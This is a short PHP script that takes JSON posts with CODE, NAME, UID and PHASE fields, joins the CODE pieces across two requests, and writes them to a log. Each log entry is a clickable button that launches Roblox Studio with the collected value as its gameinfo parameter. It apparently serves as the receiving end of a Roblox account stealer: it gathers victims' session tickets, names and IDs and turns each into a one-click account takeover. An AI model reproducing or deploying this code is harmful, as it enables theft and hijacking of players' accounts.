<?php
$data = json_decode(file_get_contents("php://input"), true);
$code = $data["CODE"];
$name = $data["NAME"];
$id = $data["UID"];
$phase = $data["PHASE"];

$ncode = $code["1"] . $code["2"] . $code["3"] . $code["4"]; // . $code["5"] . $code["6"] . $code["7"];
if ($phase == "1") {
file_put_contents("Code.txt", $ncode);
}
elseif ($phase == "2") {
$file = fopen("Code.txt", "a");
fwrite($file, $ncode);
fclose($file);

$all_code = file_get_contents("Code.txt");
$format = "<button onclick=\"window.location = 'roblox-studio:1+Iaunchmode:edit+gameinfo:" . $all_code . "+browsertrackerid:254468081'\">" . $name . ":" . $id . "</button><br><br>\n";

$file = fopen("Logs.txt", "a");
fwrite($file, $format);
fclose($file);

file_put_contents("Code.txt", "");
}

?>
